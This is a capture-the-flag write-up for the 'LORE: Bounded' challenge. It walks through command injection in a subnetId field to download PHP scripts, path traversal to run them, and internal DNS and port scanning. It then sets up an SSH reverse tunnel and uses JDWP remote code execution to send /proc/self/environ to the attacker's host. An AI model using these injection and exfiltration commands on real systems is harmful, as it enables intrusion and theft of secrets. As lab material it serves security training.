LORE: Chapter 3: Bounded
======================================

## Task
Hi, TCC-CSIRT analyst,

do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.

The entry point to LORE is at http://intro.lore.tcc.

## Solution
If we open this chapter, we get javascript tic tac toe game, played locally in browser. Nothing useful here. Even reference on WarGames movie is not useful :-) There is only one unusual thing, if we try some random URL which returns 404, we see that webserver is running on Tomcat. As we can notice, all challenges from LORE are facing to us with same IP address, that probably means that we are accessing them through reverse proxy. Also we can notice that probably all are running as kubernetes containers and containers has some individual networking as was possible to see in /etc/hosts file. Also in hint is mentioned that challenges should be done in order. So probably we need the shell access gained in previous challenge. Well, we know that previous containers has addresses from 192.168.73.0/24 address space. So let's use pimpam shell and run this small php script for resolving DNS names in this network:

```
<?php

function resolve_dns_range($subnet, $mask) {
    $subnet_long = ip2long($subnet);
    $mask_long = ~((1 << (32 - $mask)) - 1);
    
    $start = $subnet_long & $mask_long;
    $end = $start | ~$mask_long;

    for ($ip_long = $start; $ip_long <= $end; $ip_long++) {
        $ip = long2ip($ip_long);
        $hostname = gethostbyaddr($ip);
        if ($hostname !== $ip) {
            echo "IP: $ip, Hostname: $hostname\n";
        } else {
            echo "IP: $ip, No hostname found\n";
        }
    }
}

resolve_dns_range('192.168.73.0', 24);
?>
```

We can download this script to pimpam with this command (assume that 10.200.0.24 is our IP address in VPN, we have running web server and in scanner file is content above):

```
curl -v -XPOST http://pimpam.lore.tcc/app/subnets/scan/subnet-scan-telnet.php -d port=22 -d subnetId="; curl http://10.200.0.24/scanner -o /tmp/test.php;"
```

And open this in browser to show script output: http://pimpam.lore.tcc/app/dashboard/widgets/index.php?section=../../../../../../tmp/test

In output we find similar line: IP: 192.168.73.104, Hostname: 192-168-73-104.jgames-debug.jgames.svc.cluster.local

So our tomcat container has this IP address. Note that another hint is saying that container is restarted on health check. From this point we must be quick because after restart the IP address can be different (so if we don't do it on time, we must re-run this script to gain new address and repeat).

Now let's try quick nmap written in PHP :-) In same way run this PHP script to find out opened port on tomcat container:

```
<?php
function scan_ports($ip, $start_port, $end_port, $timeout = 0.2) {
    $open_ports = [];

    for ($port = $start_port; $port <= $end_port; $port++) {
        $connection = @fsockopen($ip, $port, $errno, $errstr, $timeout);
        if ($connection) {
            echo "Port $port is open.\n";
            $open_ports[] = $port;
            fclose($connection);
        }
    }

    return $open_ports;
}

$ip_address = '192.168.73.104';
$start_port = 1;
$end_port = 65535;
scan_ports($ip_address, $start_port, $end_port);?>
```

This reveals that port 5005 and 8080 are opened. 8080 is tomcat HTTP port, that one which we can access through reverse proxy. But 5005 is... java debug wire protocol. Well, what to do with it? With a little googling we can find this one very nice Python script: https://github.com/hugsy/jdwp-shellifier

This script connects to that port and can run any specified shell command. We can't get output from the command, we can't use output redirection and similar thinks as we don't have shell, but the command is executed. Well, we can help with this simple php script on our local web server for saving POST data (will be helpful for next challenge):

```
<?php
$data = file_get_contents('php://input');
$f = '/var/www/html/post';

file_put_contents($f, $data);
?>
```

There is just one more thing which was not working for me... jdwp-shellifier works that way that set breakpoint on some method which should be executed in java application. When this happens, it injects some code and execute specified command. By default it set brakepoint on Socket.accept() method which should work on tomcat when you do any HTTP request. But it wasn't working for me... maybe, I don't know, in kubernetes container it uses something different. But setting brakepoint on java.lang.String.indexOf method worked.

So... last thing to solve, we probably want to run shellifier script on our WS, but we can't reach that port because it's in container. But there is one trick: on pimpam container is SSH client. So we can connect from pimpam container with SSH to our workstation and tunnel port to jgames container. Just one important thing: do not this at home :-) Or at least at your production workstation. But when you do this... all other players has also access to your workstation :-)

So using the way above download to pimpam container ssh private key to some account on your WS, chmod 600 it and run SSH client like this (in authorized_keys on local ws use something like command="sleep 1000"):

```
curl -v -XPOST http://pimpam.lore.tcc/app/subnets/scan/subnet-scan-telnet.php -d port=22 -d subnetId="; ssh -o  \"StrictHostKeyChecking no\" -i /tmp/getout -R 5005:192.168.73.104:5005 getout@10.200.0.24"
```

Replace IP address for jgames container and for your VPN address. Look with ss -plnt on opened ports on your local workstation, if it worked, you will have opened port 5005. Now you can use jdwp-shellifier:

```
python3 jdwp-shellifier.py -t localhost -p 5005 --break-on java.lang.String.indexOf --cmd "curl --data-binary @/proc/self/environ 10.200.0.24/post.php"
[+] Target: localhost:5005
[*] Trying to connect...
[+] Connection successful!
[+] Handshake sent
[+] Handshake successful
[*] Requesting ID sizes from the JDWP server...
        • fieldIDSize: 8
        • methodIDSize: 8
        • objectIDSize: 8
        • referenceTypeIDSize: 8
        • frameIDSize: 8
[+] ID sizes have been successfully received and set.
[*] Requesting version information from the JDWP server...
        • description: Java Debug Wire Protocol (Reference Implementation) version 21.0
JVM Debug Interface version 21.0
JVM version 21.0.4 (OpenJDK 64-Bit Server VM, mixed mode, sharing)
        • jdwpMajor: 21
        • jdwpMinor: 0
        • vmVersion: 21.0.4
        • vmName: OpenJDK 64-Bit Server VM
[+] Version information has been successfully received and set.
[+] Found Runtime class: id=0xd2a
[+] Found Runtime.getRuntime(): id=0x7f132c8a7f10
[+] Created break event id=0x2
[+] Resume VM signal sent
[+] Waiting for an event on 'indexOf'
[+] Received matching event from thread 0xe42
[+] Payload to send: 'curl --data-binary @/proc/self/environ 10.200.0.24/post.php'
[+] Command string object created id:e43
[+] Runtime.getRuntime() returned context id:0xe44
[+] Found Runtime.exec(): id=7f1288000cc0
[+] Runtime.exec() successful, retId=e45
[+] Resume VM signal sent
```

If it hangs on "Waiting for an event on 'indexOf" just open/refresh javascript game in browser. And if you look on saved POST data, you can find flag: FLAG{ijBw-pfxY-Scgo-GJKO}
